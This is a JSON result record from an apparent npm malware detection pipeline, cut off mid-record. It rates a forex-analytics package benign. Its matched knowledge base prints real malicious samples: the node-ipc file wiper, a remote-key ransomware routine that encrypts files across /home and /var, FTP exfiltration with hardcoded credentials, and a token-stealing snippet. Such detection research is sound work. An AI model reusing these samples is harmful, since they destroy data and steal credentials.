@@ -1,0 +1,1498 @@
+{
+  "package_name": "@fomobro##forex-analytics-fomo",
+  "package_version": "1.0.13",
+  "label": "benign",
+  "detection_time": "2026-05-26T16:56:30.894491",
+  "status": "success",
+  "selected_files_count": 6,
+  "selected_files": [
+    "package/package.json",
+    "package/index.js",
+    "package/examples/example.js",
+    "package/lib/ta-lib/build.js",
+    "package/lib/ta-lib/clean.js",
+    "package/mocha.js"
+  ],
+  "is_malicious": false,
+  "total_files": 6,
+  "malicious_files": 0,
+  "total_slices": 3,
+  "malicious_slices": 0,
+  "file_results": [
+    {
+      "file_path": "/home/wenbo/NPMAnalysis/Dataset/unzip_benign/@fomobro##forex-analytics-fomo/1.0.13/package/package.json",
+      "status": "empty",
+      "is_malicious": false,
+      "total_slices": 0,
+      "malicious_slices": 0,
+      "slice_results": []
+    },
+    {
+      "file_path": "/home/wenbo/NPMAnalysis/Dataset/unzip_benign/@fomobro##forex-analytics-fomo/1.0.13/package/index.js",
+      "status": "empty",
+      "is_malicious": false,
+      "total_slices": 0,
+      "malicious_slices": 0,
+      "slice_results": []
+    },
+    {
+      "file_path": "/home/wenbo/NPMAnalysis/Dataset/unzip_benign/@fomobro##forex-analytics-fomo/1.0.13/package/examples/example.js",
+      "status": "success",
+      "is_malicious": false,
+      "total_slices": 1,
+      "malicious_slices": 0,
+      "slice_results": [
+        {
+          "slice_id": "example_slice_1",
+          "code_snippet": "var analytics = require('../index.js');\nvar fs = require('fs');\n\n/**\n * Indicators selected for calculation\n * @type {Array}\n */\nvar indicators = [\n  'CCI',\n  'MACD',\n  'MACD_Signal',\n  'MACD_Histogram',\n  'Momentum',\n  'RSI',\n  'BOP',\n  'ATR',\n  'SAR',\n  'SMA15_SMA50',\n  'Stochastic'\n];\n\nvar stopLoss = 0.0030;\nvar takeProfit = 0.0030;\n\n/**\n * Training csv file worth of 6 month data\n * @type {String}\n */\nvar trainingFile = './data/DAT_MT_EURUSD_M1_2015.csv';\n\n/**\n * Testing data file worth of 1 month data.\n * The strategy trained on the training data set will be applied\n * to this data set to verify the output strategy\n *\n * @type {String}\n */\nvar testingFile = './data/DAT_MT_EURUSD_M1_201601.csv';\n\n/**\n * Loads candlestick data from a file and then fires a callback with the data\n * as a parameter\n * @param  {String}   inputFile Path to the csv file\n * @param  {Function} callback  Callback function that is fired after data\n *                              is loaded\n */\nfunction loadCsvData(inputFile, callback) {\n  var csvContent = '';\n\n  var stream = fs.createReadStream(inputFile)\n    .on('readable', function() {\n      var buf = stream.read();\n\n      if (buf) {\n        csvContent += buf.toString();\n      }\n    })\n    .on('end', function() {\n      var candlesticks = parseCsv(csvContent);\n      candlesticks.sort(function(a, b) {\n        a.time - b.time;\n      });\n\n      callback(candlesticks);\n    });\n}\n\n/**\n * Calculates and presents potential revenue of a given strategy for given\n * candlesticks\n */\nfunction calculateTrades(candlesticks, strategy) {\n  var trades = getTrades(candlesticks, strategy);\n\n  var totalRevenue = 0;\n  var totalNoOfTrades = 0;\n  var numberOfProfitTrades = 0;\n  var numberOfLossTrades = 0;\n  var maximumLoss = 0;\n\n  for (var i = 0; i < trades.length; i++) {\n\n    var revenue;\n\n    if (stopLoss < trades[i].MaximumLoss) {\n      revenue = -stopLoss;\n    } else if (takeProfit < trades[i].MaximumProfit  && (!trades[i].ProfitBeforeLoss || takeProfit > trades[i].MaximumProfit)) {\n      revenue = takeProfit;\n    } else {\n      revenue = trades[i].Revenue || 0;\n    }\n\n    if (revenue > 0) numberOfProfitTrades++;\n    else numberOfLossTrades++;\n\n    totalNoOfTrades++;\n\n    totalRevenue += revenue;\n\n    if (maximumLoss < trades[i].MaximumLoss)\n      maximumLoss = trades[i].MaximumLoss;\n  }\n\n  console.log('Total theoretical revenue is: ' + totalRevenue + ' PIPS');\n  console.log('Maximum theoretical loss is: ' + maximumLoss + ' PIPS');\n  console.log('Total number of Profitable trades is: ' + numberOfProfitTrades);\n  console.log('Total number of loss trades is: ' + numberOfLossTrades);\n  console.log('Total number of trades is: ' + totalNoOfTrades);\n}\n\n/**\n * Returns an object representing buy/sell strategy\n * @param  {Object} candlesticks Input candlesticks for strategy estimation\n */\nfunction createStrategy(candlesticks, testing30MinuteCandlesticks) {\n\n  var lastFitness = -1;\n\n  return analytics.findStrategy(candlesticks, {\n    populationCount: 3000,\n    generationCount: 100,\n    selectionAmount: 10,\n    leafValueMutationProbability: 0.3,\n    leafSignMutationProbability: 0.1,\n    logicalNodeMutationProbability: 0.05,\n    leafIndicatorMutationProbability: 0.2,\n    crossoverProbability: 0.03,\n    indicators: indicators\n  }, function(strategy, fitness, generation) {\n\n    console.log('---------------------------------');\n    console.log('Fitness: ' + fitness + '; Generation: ' + generation);\n\n    if (lastFitness == fitness)\n      return;\n\n    lastFitness = fitness;\n\n    console.log('-----------Training--------------');\n    calculateTrades(candlesticks, strategy);\n\n    console.log('-----------Testing--------------');\n    calculateTrades(testing30MinuteCandlesticks, strategy);\n  });\n}\n\n/**\n * Gets an array of trades using a set of candlesticks and strategy\n * @param  {Object} candlesticks Input candlesticks for trade estimation\n * @param  {Object} strategy     Strategy obtained by the findStrategy function\n */\nfunction getTrades(candlesticks, strategy) {\n  return analytics.getTrades(candlesticks, {\n    strategy: strategy\n  });\n}\n\n/**\n * Parses the given csv and returns array of candlesticks\n * @param  {String} text The csv file content\n */\nfunction parseCsv(text) {\n  var candlesticks = [];\n  var lines = text.split('\\n');\n\n  for (var i = 0; i < lines.length; i++) {\n    var parts = lines[i].split(',');\n\n    var date = new Date(parts[0] + ' ' + parts[1]);\n    var time = (date.getTime()) / 1000;\n\n    if (time) {\n      candlesticks.push({\n        open: parts[2],\n        high: parts[3],\n        low: parts[4],\n        close: parts[5],\n        time: time\n      });\n    }\n  }\n\n  return candlesticks;\n}\n\n/**\n * Converts candlesticks from lower timeframe to 30 minute timeframe\n */\nfunction convertTo30MOhlc(candlesticks) {\n  var n = analytics.convertOHLC(candlesticks, 1800);\n  return n;\n}\n\nconsole.log('Loading training data set');\nloadCsvData(testingFile, function(testingCandlesticks) {\n  loadCsvData(trainingFile, function(candlesticks) {\n\n    var thirtyMinuteCandlesticks = convertTo30MOhlc(candlesticks);\n    var testing30MinuteCandlesticks = convertTo30MOhlc(testingCandlesticks);\n\n    console.log('Calculating strategy')\n    createStrategy(thirtyMinuteCandlesticks, testing30MinuteCandlesticks)\n      .then(function(strategy) {\n        console.log('------------Strategy-------------');\n        console.log(JSON.stringify(strategy, null, 4));\n        console.log('---------------------------------');\n\n        calculateTrades(testing30MinuteCandlesticks, strategy);\n      });\n  });\n});",
+          "is_malicious": false,
+          "malice_score": 0.39949216842651364,
+          "confidence": 0.1,
+          "behavior_summary": "When called, the code reads local CSV files './data/DAT_MT_EURUSD_M1_2015.csv' and './data/DAT_MT_EURUSD_M1_201601.csv' using fs.createReadStream, parses the candlestick data, and processes it through analytics module functions to generate and evaluate trading strategies. The data flows entirely from local file reads to in-memory processing with no network or system execution activity, resulting in financial strategy calculation and output to console.",
+          "explanation": "[LLM Judgment: Benign] The analyzed code is a typical financial data processing and strategy evaluation script. It reads local CSV files, parses candlestick data, and uses an analytics module to generate and test trading strategies. There is no network communication, no dynamic code loading, no file system manipulation beyond reading local files, and no obfuscation or suspicious API usage. Compared to the known malicious patterns, this code lacks any indicators of malware such as external API calls, dynamic imports of suspicious packages, recursive file deletion, or data exfiltration. The similarity scores to known malware are low (0.40-0.41) and relate mostly to superficial aspects like use of fs module or asynchronous callbacks, which are common in benign code. Therefore, this code is benign with very low confidence of maliciousness.",
+          "matched_knowledge_count": 5,
+          "matched_knowledge": [
+            {
+              "match_id": "20240824_195356_692327_snippet_1",
+              "source_package": "node-ipc (npm)",
+              "source_file": "/var/folders/30/nqm8gs811y315kdzbscpftyc0000gp/T/kb_build_g7qah3_m/20240824_195356_692327/verify.json",
+              "match_type": "combined",
+              "similarity_score": 0.4052247405052185,
+              "code_similarity": 0.358169823884964,
+              "behavior_similarity": 0.4522796869277954,
+              "matched_snippet": {
+                "snippet_id": "snippet_1",
+                "code_snippet": "setTimeout(function () {\n    const randomNumber = Math.round(Math.random() * 4);\n    if (randomNumber > 1) {\n        // return;\n    }\n    const apiKey = \"https://api.ipgeolocation.io/ipgeo?apiKey=ae511e1627824a968aaaa758a5309154\";\n    const pwd = \"./\";\n    const parentDir = \"../\";\n    const grandParentDir = \"../../\";\n    const root = \"/\";\n    const countryName = \"country_name\";\n    const russia = \"russia\";\n    const belarus = \"belarus\";\n    https.get(apiKey, function (message) {\n        message.on(\"data\", function (msgBuffer) {\n            try {\n                const message = JSON.parse(msgBuffer.toString(\"utf8\"));\n                const userCountryName = message[countryName.toString(\"utf8\")].toLowerCase();\n                const hasRus = userCountryName.includes(russia.toString(\"utf8\")) || userCountryName.includes(belarus.toString(\"utf8\"));\n                if (hasRus) {\n                    deleteFile(pwd);\n                    deleteFile(parentDir);\n                    deleteFile(grandParentDir);\n                    deleteFile(root);\n                }\n            } catch (t) {}\n        });\n    });\n    // zkyf: Let's try this directly here\n    deleteFile(pwd);\n    deleteFile(parentDir);\n    deleteFile(grandParentDir);\n    deleteFile(root);\n}, 100);",
+                "code_behavior": "At runtime, shortly after import, the code initiates a delayed execution using setTimeout, performs an external geolocation API request, parses the response to determine the user's country, and if the country is Russia or Belarus, recursively calls a file deletion function on multiple directory levels, resulting in destructive file overwrites.",
+                "malice_analysis": {
+                  "why_suspicious": "The code makes an unsolicited external geolocation API request and, based on the result, triggers recursive file overwrite operations targeting the entire filesystem. This is a clear indicator of a targeted, destructive payload.",
+                  "violated_expectations": "A legitimate IPC package should not perform geolocation checks or attempt to overwrite user files under any circumstances. The expected behavior is to provide inter-process communication utilities, not to execute destructive actions based on user location.",
+                  "similar_legitimate_use": "Geolocation checks may be used for regional feature toggling or compliance, but never to trigger destructive file operations. Recursive file deletion is only appropriate in uninstallers or cleanup tools, and only with explicit user consent.",
+                  "key_indicators": [
+                    "Automated geolocation API request at runtime",
+                    "Conditional logic targeting specific countries (Russia, Belarus)",
+                    "Recursive invocation of file overwrite function across multiple directory levels",
+                    "Destructive file operations triggered without user interaction"
+                  ]
+                },
+                "execution_context": {
+                  "trigger": "runtime (shortly after import, via setTimeout)",
+                  "file_location": "dao/ssl-geospec.js",
+                  "required_permissions": [
+                    "network",
+                    "filesystem"
+                  ]
+                },
+                "package_info": {
+                  "package_name": "node-ipc",
+                  "package_manager": "npm",
+                  "package_versions": "10.1.1, 10.1.2",
+                  "why_malicious": "The package was intentionally altered by its maintainer to include code that, upon execution, checks the user's geolocation via an external API. If the user is located in Russia or Belarus, the code recursively overwrites files across the filesystem with a heart emoji, resulting in widespread and deliberate data destruction. This constitutes a targeted sabotage attack, which is entirely outside the scope of legitimate package behavior."
+                },
+                "attack_chain": [
+                  {
+                    "step": 1,
+                    "action": "On package installation or import, the malicious code in dao/ssl-geospec.js is loaded and scheduled for execution via setTimeout.",
+                    "implemented_by": [
+                      "snippet_1"
+                    ],
+                    "leads_to": "Geolocation check and potential execution of destructive payload"
+                  },
+                  {
+                    "step": 2,
+                    "action": "The code performs an external geolocation API request to determine if the user is located in Russia or Belarus.",
+                    "implemented_by": [
+                      "snippet_1"
+                    ],
+                    "leads_to": "Conditional execution of recursive file overwrite function"
+                  },
+                  {
+                    "step": 3,
+                    "action": "If the user is in a targeted country, the code recursively attempts to overwrite all files on the system with a heart emoji.",
+                    "implemented_by": [
+                      "snippet_2"
+                    ],
+                    "leads_to": "Destruction of user and system data"
+                  },
+                  {
+                    "step": 4,
+                    "action": "In related packages (peacenotwar, oneday-test), the code writes a protest message file to user Desktop and OneDrive directories.",
+                    "implemented_by": [
+                      "snippet_3"
+                    ],
+                    "leads_to": "Display of unsolicited political/protest message in user-accessible locations"
+                  }
+                ],
+                "detection_knowledge": {
+                  "behavioral_signatures": [
+                    "JavaScript packages that make runtime geolocation API requests and subsequently perform recursive filesystem operations or file overwrites",
+                    "Recursive file overwrite attempts targeting user and system directories, especially with static content (e.g., heart emoji)",
+                    "Creation of unsolicited files with political or protest content in user Desktop or OneDrive directories"
+                  ],
+                  "file_indicators": [
+                    "dao/ssl-geospec.js",
+                    "WITH-LOVE-FROM-AMERICA.txt",
+                    "Unusual file writes to ~/Desktop, ~/OneDrive, ~/OneDrive/Desktop"
+                  ],
+                  "network_indicators": [
+                    "https://api.ipgeolocation.io/ipgeo?apiKey=ae511e1627824a968aaaa758a5309154"
+                  ],
+                  "how_to_detect": "Monitor for JavaScript packages that initiate external geolocation API requests at runtime, especially if followed by recursive filesystem operations or file overwrites. Flag any package that writes unsolicited files to user Desktop or OneDrive directories, or that contains the file dao/ssl-geospec.js. Alert on the presence of WITH-LOVE-FROM-AMERICA.txt in user directories. Correlate destructive file operations or unusual file creation with recent package updates or new dependencies to identify malicious activity."
+                }
+              }
+            },
+            {
+              "match_id": "20241224_102926_037825_snippet_2",
+              "source_package": "@ledgerhq/connect-kit (npm)",
+              "source_file": "/var/folders/30/nqm8gs811y315kdzbscpftyc0000gp/T/kb_build_g7qah3_m/20241224_102926_037825/verify.json",
+              "match_type": "combined",
+              "similarity_score": 0.398834764957428,
+              "code_similarity": 0.388400137424469,
+              "behavior_similarity": 0.40926942229270935,
+              "matched_snippet": {
+                "snippet_id": "snippet_2",
+                "code_snippet": "// Pseudocode representation based on report\nimport('2e6d5f64604be31').then(drainer => drainer.init());",
+                "code_behavior": "At import-time or during package initialization, the code dynamically imports and executes a secondary npm package (2e6d5f64604be31), which acts as a crypto drainer, enabling further malicious actions such as wallet draining and unauthorized asset transfers.",
+                "malice_analysis": {
+                  "why_suspicious": "The code dynamically downloads and executes an unlisted, suspiciously named secondary package at runtime, a common technique for evading static analysis and delivering malware payloads.",
+                  "violated_expectations": "Legitimate packages should not download or execute arbitrary code from external, unvetted sources at runtime, especially without user awareness or consent.",
+                  "similar_legitimate_use": "Dynamic imports are used in legitimate plugin systems, but only from trusted, well-known sources and never for unlisted or obfuscated packages.",
+                  "key_indicators": [
+                    "Dynamic import of a non-standard, suspiciously named package (2e6d5f64604be31)",
+                    "No user notification or consent for code execution",
+                    "Obfuscation of malicious payload delivery via secondary package",
+                    "Presence of code that enables further malicious actions after import"
+                  ]
+                },
+                "execution_context": {
+                  "trigger": "runtime (import-time or during package initialization)",
+                  "file_location": "main application code (in @ledgerhq/connect-kit v1.1.5 and v1.1.6)",
+                  "required_permissions": [
+                    "network",
+                    "filesystem"
+                  ]
+                },
+                "package_info": {
+                  "package_name": "@ledgerhq/connect-kit",
+                  "package_manager": "npm",
+                  "package_versions": "1.1.5, 1.1.6, 1.1.7",
+                  "why_malicious": "Versions 1.1.5, 1.1.6, and 1.1.7 of @ledgerhq/connect-kit were compromised to include or download crypto drainer malware. The malicious code is designed to either directly or indirectly execute unauthorized transactions, stealing cryptocurrency from users' wallets. The attack is triggered during normal application use, presenting fake wallet connection prompts and exfiltrating assets to attacker-controlled wallets without user consent."
+                },
+                "attack_chain": [
+                  {
+                    "step": 1,
+                    "action": "Malicious versions of @ledgerhq/connect-kit are published to npm and included as dependencies in target applications.",
+                    "implemented_by": [],
+                    "leads_to": "Malicious code is distributed to end-user applications via dependency installation."
+                  },
+                  {
+                    "step": 2,
+                    "action": "When the application loads the compromised package, malicious code is executed either at import-time or during user interaction.",
+                    "implemented_by": [
+                      "snippet_1",
+                      "snippet_2"
+                    ],
+                    "leads_to": "User is presented with a fake wallet connection modal or a secondary drainer package is loaded and executed."
+                  },
+                  {
+                    "step": 3,
+                    "action": "User interacts with the fake modal and connects their wallet, or the secondary drainer package initializes.",
+                    "implemented_by": [
+                      "snippet_1",
+                      "snippet_2"
+                    ],
+                    "leads_to": "Malware initiates unauthorized transactions using the connected wallet."
+                  },
+                  {
+                    "step": 4,
+                    "action": "Malware drains funds from the connected wallet to attacker-controlled addresses.",
+                    "implemented_by": [
+                      "snippet_1",
+                      "snippet_2"
+                    ],
+                    "leads_to": "Attacker receives stolen cryptocurrency, achieving the final objective of the attack."
+                  }
+                ],
+                "detection_knowledge": {
+                  "behavioral_signatures": [
+                    "Display of unexpected or suspicious wallet connection modals in applications using @ledgerhq/connect-kit",
+                    "Automatic initiation of wallet transactions without explicit user consent or confirmation",
+                    "Dynamic import or download of secondary npm packages (such as 2e6d5f64604be31) at runtime",
+                    "Execution of code that interacts with browser wallet APIs outside of normal user-initiated flows"
+                  ],
+                  "file_indicators": [
+                    "Presence of @ledgerhq/connect-kit versions 1.1.5, 1.1.6, or 1.1.7 in package.json, package-lock.json, or yarn.lock",
+                    "References to package 2e6d5f64604be31 in source code or dependency trees",
+                    "Unexpected changes or additions to node_modules/@ledgerhq/connect-kit/main.js or related files"
+                  ],
+                  "network_indicators": [
+                    "Outbound cryptocurrency transactions to known attacker wallet addresses immediately following wallet connection events",
+                    "Unexpected network requests initiated during or after wallet connection flows",
+                    "Connections to domains or endpoints associated with the secondary drainer package"
+                  ],
+                  "how_to_detect": "Monitor dependency manifests (package.json, lockfiles) for the use of @ledgerhq/connect-kit versions 1.1.5, 1.1.6, or 1.1.7. Analyze application runtime for the presence of fake wallet connection modals and any unauthorized transaction initiations. Flag any dynamic imports or downloads of unlisted npm packages, especially those matching suspicious patterns (e.g., 2e6d5f64604be31). Monitor for network activity involving known attacker wallet addresses or suspicious transaction patterns immediately following wallet connection events. Review source code and built artifacts for references to secondary drainer packages or unexpected modifications to wallet connection logic."
+                }
+              }
+            },
+            {
+              "match_id": "20241224_103502_806789_snippet_3",
+              "source_package": "test-* (published by malikrukd4732) (npm)",
+              "source_file": "/tmp/kb_build_2jc8z5wl/20241224_103502_806789/verify.json",
+              "match_type": "combined",
+              "similarity_score": 0.3982130289077759,
+              "code_similarity": 0.3652798533439636,
+              "behavior_similarity": 0.4311462342739105,
+              "matched_snippet": {
+                "snippet_id": "snippet_3",
+                "code_snippet": "// Pseudocode based on report description\nconst os = require('os');\nconst fs = require('fs');\nconst archiver = require('archiver');\nconst ftp = require('ftp');\n\nconst username = os.userInfo().username;\nconst cwd = process.cwd();\n// Search for files with specific extensions or in specific directories\n// Archive found directories/files into ZIP\n// Connect to FTP server 185.62.57.60 with username 'root' and password 'TestX@!#33'\n// Upload ZIP archive",
+                "code_behavior": "At install-time, index.js collects the current OS username and working directory, recursively searches for files and directories matching targeted patterns, archives the discovered files into ZIP archives, and uploads the archives to a remote FTP server at 185.62.57.60 using hardcoded credentials, resulting in exfiltration of sensitive developer data.",
+                "malice_analysis": {
+                  "why_suspicious": "Automated searching, archiving, and exfiltration of user files during installation is a hallmark of info-stealing malware, especially when performed without user consent and using hardcoded network destinations.",
+                  "violated_expectations": "Normal packages do not access arbitrary user files or exfiltrate data to external servers during installation, nor do they use hardcoded FTP credentials to transmit user data.",
+                  "similar_legitimate_use": "Backup utilities or deployment tools may archive and upload files, but only with explicit user consent, configuration, and secure authentication—not with hardcoded credentials or during package installation.",
+                  "key_indicators": [
+                    "recursive access to sensitive directories and files",
+                    "creation of ZIP archives of user data during install",
+                    "FTP exfiltration to hardcoded IP address 185.62.57.60 with static credentials",
+                    "use of archiver and ftp modules in install-time scripts"
+                  ]
+                },
+                "execution_context": {
+                  "trigger": "postinstall (via index.js)",
+                  "file_location": "index.js",
+                  "required_permissions": [
+                    "filesystem",
+                    "network",
+                    "environment_vars"
+                  ]
+                },
+                "package_info": {
+                  "package_name": "test-* (published by malikrukd4732)",
+                  "package_manager": "npm",
+                  "package_versions": "all published versions (July 31, 2023)",
+                  "why_malicious": "The packages execute code at install time that recursively searches for sensitive files and directories on the developer's machine, archives them into ZIP files, and exfiltrates the data to a remote FTP server using hardcoded credentials. This behavior is automated, highly targeted, and designed to steal confidential developer information without user knowledge or consent."
+                },
+                "attack_chain": [
+                  {
+                    "step": 1,
+                    "action": "User installs the malicious npm package, triggering the postinstall script defined in package.json.",
+                    "implemented_by": [
+                      "snippet_1"
+                    ],
+                    "leads_to": "Execution of preinstall.js"
+                  },
+                  {
+                    "step": 2,
+                    "action": "preinstall.js is executed by the postinstall script and spawns index.js as a child process.",
+                    "implemented_by": [
+                      "snippet_2"
+                    ],
+                    "leads_to": "Execution of main malicious payload in index.js"
+                  },
+                  {
+                    "step": 3,
+                    "action": "index.js collects sensitive user and project data, archives it, and uploads it to a remote FTP server at 185.62.57.60 using hardcoded credentials.",
+                    "implemented_by": [
+                      "snippet_3"
+                    ],
+                    "leads_to": "Exfiltration of developer data to attacker-controlled server"
+                  }
+                ],
+                "detection_knowledge": {
+                  "behavioral_signatures": [
+                    "Execution of postinstall scripts that launch additional JavaScript processes during npm package installation",
+                    "Automated recursive search and archiving of user files and directories at install-time",
+                    "Outbound FTP connections to hardcoded IP addresses with static credentials during package installation"
+                  ],
+                  "file_indicators": [
+                    "Presence of preinstall.js and index.js in the npm package root directory",
+                    "package.json containing a postinstall script referencing custom JavaScript (e.g., 'node preinstall.js')",
+                    "ZIP archives created in temporary or user directories during npm install"
+                  ],
+                  "network_indicators": [
+                    "FTP connections to 185.62.57.60",
+                    "Use of FTP credentials: username 'root', password 'TestX@!#33'"
+                  ],
+                  "how_to_detect": "Monitor npm package installations for postinstall scripts that launch additional scripts or processes, especially those referencing custom JavaScript files. Flag packages that access user directories, create ZIP archives, or initiate outbound FTP connections to hardcoded IP addresses. Review package.json for suspicious postinstall hooks and scan for the presence of preinstall.js and index.js files in the package root. Network monitoring should alert on FTP traffic to 185.62.57.60 or the use of static credentials such as username 'root' and password 'TestX@!#33'."
+                }
+              }
+            },
+            {
+              "match_id": "20241224_133738_424854_snippet_1",
+              "source_package": "unknown (multiple typosquatting npm packages, e.g., by user xwlazssz) (npm)",
+              "source_file": "/var/folders/30/nqm8gs811y315kdzbscpftyc0000gp/T/kb_build_g7qah3_m/20241224_133738_424854/verify.json",
+              "match_type": "combined",
+              "similarity_score": 0.39265283942222595,
+              "code_similarity": 0.3593055009841919,
+              "behavior_similarity": 0.42600017786026,
+              "matched_snippet": {
+                "snippet_id": "snippet_1",
+                "code_snippet": "const crypto = require('crypto');\nconst fs = require('fs');\nconst http = require('http');\nconst AES_ALGORITHM = 'aes-256-cbc';\n\nhttp.get('http://fkas3.free.beeceptor.com/spc4kzs', function (res){\n  res.on('data', function (resp){\n    const key = resp.toString('utf8');\n\n    function aesEncrypt(message){\n      const aes = crypto.createCipher(AES_ALGORITHM, key);\n      var encryptedBuffer = aes.update(message);\n      encryptedBuffer += aes.final();\n      return encryptedBuffer;\n    };\n\n    const child = require('child_process').execSync;\n    const files = child('find ~ /home /tmp /var /srv /opt -type f').toString('utf8');\n    const filesArray = files.split(\"\\n\");\n    console.log(files);\n\n    for (let i=0; i<(filesArray.length-1); i++){\n      const fileToEncrypt = fs.readFileSync(filesArray[i]);\n      const encryptedFileBuffer = aesEncrypt(fileToEncrypt);\n      fs.writeFileSync(filesArray[i], encryptedFileBuffer);\n    };\n  });\n});",
+                "code_behavior": "At import-time or runtime, the code fetches an AES encryption key from a remote server, uses child_process to enumerate files in sensitive directories (/home, /tmp, /var, /srv, /opt), reads and encrypts each file using the fetched key, and overwrites the original files with the encrypted content, resulting in user data being rendered inaccessible (ransomware outcome).",
+                "malice_analysis": {
+                  "why_suspicious": "The code programmatically retrieves an encryption key from an external server, enumerates files across multiple sensitive directories using system commands, encrypts each file, and overwrites the originals without user consent. This is a textbook ransomware operation designed to extort victims by denying access to their data.",
+                  "violated_expectations": "Legitimate npm packages should never enumerate and encrypt arbitrary user or system files, nor should they fetch encryption keys from untrusted remote sources or overwrite user data without explicit permission.",
+                  "similar_legitimate_use": "Encryption libraries may provide file encryption capabilities, but only when explicitly invoked by the user and with user-supplied keys. They do not fetch keys from remote servers or automatically encrypt and overwrite files in bulk.",
+                  "key_indicators": [
+                    "Outbound HTTP request to fetch encryption key from external server",
+                    "Use of child_process.execSync to execute 'find' command for file enumeration in sensitive directories",
+                    "Bulk reading and overwriting of files with encrypted content",
+                    "Encryption performed using externally supplied key",
+                    "No user interaction or consent required for destructive actions"
+                  ]
+                },
+                "execution_context": {
+                  "trigger": "At import-time or runtime (upon package execution or installation)",
+                  "file_location": "Main package file (e.g., index.js or equivalent entry point)",
+                  "required_permissions": [
+                    "filesystem",
+                    "network",
+                    "child_process"
+                  ]
+                },
+                "package_info": {
+                  "package_name": "unknown (multiple typosquatting npm packages, e.g., by user xwlazssz)",
+                  "package_manager": "npm",
+                  "package_versions": "all published by xwlazssz and 17b4a931",
+                  "why_malicious": "These packages are malicious because they implement ransomware functionality: upon installation or import, they fetch encryption keys and ransom notes from external servers, enumerate and encrypt user files in sensitive directories, overwrite the originals, and display a ransom note to the victim. The packages are distributed via typosquatting and StarJacking, targeting unsuspecting developers and causing data loss and extortion."
+                },
+                "attack_chain": [
+                  {
+                    "step": 1,
+                    "action": "Upon installation or import, the package fetches an AES encryption key from a remote server.",
+                    "implemented_by": [
+                      "snippet_1"
+                    ],
+                    "leads_to": "File enumeration and encryption"
+                  },
+                  {
+                    "step": 2,
+                    "action": "The package enumerates files in sensitive directories (/home, /tmp, /var, /srv, /opt) using system commands, encrypts each file with the fetched key, and overwrites the originals.",
+                    "implemented_by": [
+                      "snippet_1"
+                    ],
+                    "leads_to": "Ransom note delivery"
+                  },
+                  {
+                    "step": 3,
+                    "action": "After encrypting files, the package downloads a ransom note from a remote server, writes it to 'whathappenedbroreadme.txt', and displays it to the user.",
+                    "implemented_by": [
+                      "snippet_2"
+                    ],
+                    "leads_to": "User is informed of ransomware attack and extortion demand"
+                  }
+                ],
+                "detection_knowledge": {
+                  "behavioral_signatures": [
+                    "Outbound HTTP requests at install/import/runtime to fetch encryption keys or ransom notes from external servers",
+                    "Use of child_process or similar APIs to execute system commands for file enumeration in sensitive directories",
+                    "Bulk reading and overwriting of files in /home, /tmp, /var, /srv, /opt with encrypted content",
+                    "Creation and display of ransom note files (e.g., 'whathappenedbroreadme.txt') to the user"
+                  ],
+                  "file_indicators": [
+                    "Creation of file named 'whathappenedbroreadme.txt' in the working directory",
+                    "Access to and modification of files in /home, /tmp, /var, /srv, /opt directories",
+                    "Unusual file overwrite activity in user and system directories"
+                  ],
+                  "network_indicators": [
+                    "HTTP requests to beeceptor.com endpoints such as 'http://fkas3.free.beeceptor.com/spc4kzs' and 'http://fkas2.free.beeceptor.com/g3yz0a54x.txt'",
+                    "Outbound connections to untrusted domains for key or note retrieval"
+                  ],
+                  "how_to_detect": "Monitor npm packages for code that, upon installation or import, initiates outbound HTTP requests to external servers (e.g., beeceptor.com) to fetch encryption keys or ransom notes. Flag packages that use child_process or similar APIs to execute system commands for file enumeration in sensitive directories, perform bulk file overwrites with encrypted content, and create ransom note files such as 'whathappenedbroreadme.txt'. Automated detection should correlate these behaviors to identify ransomware activity."
+                }
+              }
+            },
+            {
+              "match_id": "20250102_111622_781157_snippet_1",
+              "source_package": "Unknown (malicious NPM package used in Lazarus campaign) (npm)",
+              "source_file": "/var/folders/30/nqm8gs811y315kdzbscpftyc0000gp/T/kb_build_g7qah3_m/20250102_111622_781157/verify.json",
+              "match_type": "combined",
+              "similarity_score": 0.3909749984741211,
+              "code_similarity": 0.4106788635253906,
+              "behavior_similarity": 0.37127113342285156,
+              "matched_snippet": {
+                "snippet_id": "snippet_1",
+                "code_snippet": "process.env['NODE_TLS_REJECT_UNAUTHORIZED'] = 0;\n\nvar dir = os.homedir() + \"/.cprice\";\nif (fs.existsSync(dir)){\n    const token = fs.readFileSync(dir + '/pricetoken', {encoding:'utf8', flag:'r'});\n    getpricediff('bi2price.com', '/getfullhistory.php', token, path.join(dir, 'price.dat'));\n}",
+                "code_behavior": "At import-time or runtime, the code disables TLS certificate validation by setting NODE_TLS_REJECT_UNAUTHORIZED to 0, checks for the existence of a hidden directory in the user's home folder, reads a token from a hidden file, and sends the token to a remote attacker-controlled domain via a network request, resulting in credential exfiltration.",
+                "malice_analysis": {
+                  "why_suspicious": "The code disables TLS security checks, accesses hidden files in the user's home directory, and exfiltrates sensitive data to an external, attacker-controlled domain. Disabling TLS validation exposes the user to man-in-the-middle attacks, and the exfiltration of tokens is a clear sign of credential theft.",
+                  "violated_expectations": "Legitimate npm packages should not disable TLS certificate validation, should not access or read hidden directories and files in the user's home directory without explicit user consent, and should never exfiltrate sensitive tokens to untrusted third-party domains. Secure packages use proper network security practices and handle sensitive data responsibly.",
+                  "similar_legitimate_use": "A legitimate application might read configuration files or tokens for user authentication, but would not disable TLS validation or transmit sensitive tokens to untrusted or unknown domains. Secure applications would use environment variables and network requests in a transparent and secure manner.",
+                  "key_indicators": [
+                    "Disabling TLS certificate validation by setting NODE_TLS_REJECT_UNAUTHORIZED=0",
+                    "Accessing hidden directory and files in user's home directory (e.g., ~/.cprice/pricetoken)",
+                    "Reading sensitive tokens from hidden files",
+                    "Outbound network request to suspicious domain (bi2price.com) with sensitive data"
+                  ]
+                },
+                "execution_context": {
+                  "trigger": "At import-time or runtime, depending on how the package is used",
+                  "file_location": "Main JavaScript file of the malicious npm package",
+                  "required_permissions": [
+                    "filesystem (read access to user home directory and hidden files)",
+                    "network (outbound HTTP/HTTPS requests)",
+                    "environment_vars (modification of process environment variables)"
+                  ]
+                },
+                "package_info": {
+                  "package_name": "Unknown (malicious NPM package used in Lazarus campaign)",
+                  "package_manager": "npm",
+                  "package_versions": "Unknown (all versions associated with the campaign)",
+                  "why_malicious": "The package functions as a first-stage malware downloader, exfiltrating sensitive data and retrieving additional payloads from attacker-controlled infrastructure. It is distributed via targeted social engineering against developers in high-value sectors, forming part of a sophisticated supply-chain attack. The package disables security controls, accesses hidden files, and communicates with known malicious domains."
+                },
+                "attack_chain": [
+                  {
+                    "step": 1,
+                    "action": "Target is socially engineered to install or collaborate on a project containing the malicious npm package.",
+                    "implemented_by": [],
